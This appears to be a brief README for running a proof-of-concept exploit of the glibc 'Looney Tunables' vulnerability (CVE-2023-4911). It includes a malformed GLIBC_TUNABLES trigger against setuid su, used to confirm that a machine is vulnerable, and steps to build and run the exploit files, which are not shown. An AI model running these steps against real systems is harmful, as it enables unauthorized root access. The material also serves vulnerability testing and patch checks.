### Step 1

Check the `glibc` version
```
ldd --version
```

Check if a machine is vulnerable to Looney Tunables CVE-2023-4911
```
env -i "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A" "Z=`printf '%08192x' 1`" /usr/bin/su --help
```

If we get a `Segmentation fault (core dumped)`, then machine is vulnerable.

### Step 2
```
python3 libc.py
```

### Step 3
```
gcc -o exp exp.c
./exp
```
